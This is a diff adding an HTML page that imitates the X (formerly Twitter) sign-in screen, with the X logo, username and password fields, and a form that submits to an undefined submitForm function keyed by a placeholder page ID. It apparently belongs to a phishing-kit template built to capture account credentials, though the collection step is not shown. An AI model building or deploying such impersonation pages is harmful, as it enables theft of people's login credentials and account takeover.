@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X (formerly Twitter) - Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo-text { font-size: 32px; font-weight: bold; }
+        .title { font-size: 31px; font-weight: bold; margin-bottom: 32px; }
+        .form-group { margin-bottom: 20px; }
+        input { width: 100%; padding: 16px; background: transparent; border: 1px solid #333; border-radius: 4px; color: white; font-size: 17px; }
+        input:focus { border-color: #1d9bf0; outline: none; }
+        input::placeholder { color: #71767b; }
+        .login-btn { background: white; color: black; border: none; border-radius: 20px; padding: 12px 24px; width: 100%; font-size: 15px; font-weight: bold; margin: 12px 0; cursor: pointer; }
+        .forgot-link { color: #1d9bf0; text-decoration: none; font-size: 15px; display: block; margin: 20px 0; }
+        .signup-section { margin-top: 40px; color: #71767b; }
+        .signup-btn { background: transparent; color: #1d9bf0; border: 1px solid #333; border-radius: 20px; padding: 8px 16px; font-size: 15px; font-weight: bold; cursor: pointer; }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px !important;
+                flex-direction: column !important;
+            }
+
+            .left-section {
+                display: none !important;
+            }
+
+            .right-section {
+                max-width: 100% !important;
+                padding: 0 !important;
+            }
+
+            .login-box {
+                padding: 20px !important;
+                margin: 20px 0 !important;
+            }
+
+            .form-input {
+                font-size: 16px !important;
+                padding: 12px !important;
+            }
+
+            .login-btn {
+                font-size: 16px !important;
+                padding: 12px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-text">𝕏</div>
+        </div>
+        <h1 class="title">Sign in to X</h1>
+        <form id="loginForm" onsubmit="submitForm(event, 'PLACEHOLDER_PAGE_ID')">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Phone, email, or username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Sign in</button>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </form>
+        <div class="signup-section">
+            Don't have an account? <button type="button" class="signup-btn">Sign up</button>
+        </div>
+    </div>
+</body>
+</html>
